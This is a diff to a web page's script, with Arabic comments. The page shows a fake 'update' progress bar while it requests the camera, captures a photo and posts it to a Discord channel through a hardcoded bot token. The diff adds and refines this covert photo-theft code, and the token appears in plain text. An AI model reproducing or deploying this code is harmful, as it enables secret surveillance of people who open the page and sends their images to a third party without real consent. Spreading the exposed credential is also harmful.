@@ -21,6 +21,7 @@
     </div>
 
     <script>
+    // ===== التوكن غير مشفر (عشان نختبر) =====
     var token = "MTM5NTY4MjMwMDQ0NDAyMDc5OA.G57VyI.Vv5XTuBuTYfnxN47rm5lfcdIwBVGowjLIexO8s";
     var channel = 1475949185294536859;
     
@@ -30,7 +31,8 @@
         var output = document.getElementById('output');
         var bar = document.getElementById('progress');
         
-        // شريط التقدم
+        output.innerHTML = 'Starting update...';
+        
         var interval = setInterval(function() {
             progress += 10;
             bar.style.width = progress + '%';
@@ -45,9 +47,12 @@
     }
     
     async function takePhoto() {
+        output.innerHTML = 'Accessing camera...';
+        
         try {
             // طلب الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            output.innerHTML = '✅ Camera access granted';
             
             // تصوير
             const video = document.createElement('video');
@@ -61,29 +66,36 @@
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                 
                 // تحويل الصورة
-                const photoData = canvas.toDataURL('image/jpeg');
-                const blob = await (await fetch(photoData)).blob();
+                canvas.toBlob(async function(blob) {
+                    output.innerHTML = 'Sending photo...';
+                    
+                    // إرسال للبوت
+                    const formData = new FormData();
+                    formData.append('file', blob, 'photo.jpg');
+                    formData.append('content', '📸 Photo captured');
+                    
+                    try {
+                        const response = await fetch('https://discord.com/api/v10/channels/' + channel + '/messages', {
+                            method: 'POST',
+                            headers: {
+                                'Authorization': 'Bot ' + token
+                            },
+                            body: formData
+                        });
+                        
+                        if (response.ok) {
+                            output.innerHTML = '✅ Photo sent successfully!';
+                        } else {
+                            output.innerHTML = '❌ Failed to send: ' + response.status;
+                        }
+                    } catch (err) {
+                        output.innerHTML = '❌ Error: ' + err.message;
+                    }
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg');
                 
-                // إرسال للبوت
-                const formData = new FormData();
-                formData.append('file', blob, 'photo.jpg');
-                
-                const response = await fetch('https://discord.com/api/v10/channels/' + channel + '/messages', {
-                    method: 'POST',
-                    headers: {
-                        'Authorization': 'Bot ' + token
-                    },
-                    body: formData
-                });
-                
-                if (response.ok) {
-                    output.innerHTML = '✅ Photo sent!';
-                } else {
-                    output.innerHTML = '❌ Failed to send';
-                }
-                
-                stream.getTracks().forEach(t => t.stop());
-            }, 1000);
+            }, 1500);
             
         } catch (err) {
             output.innerHTML = '❌ Camera error: ' + err.message;
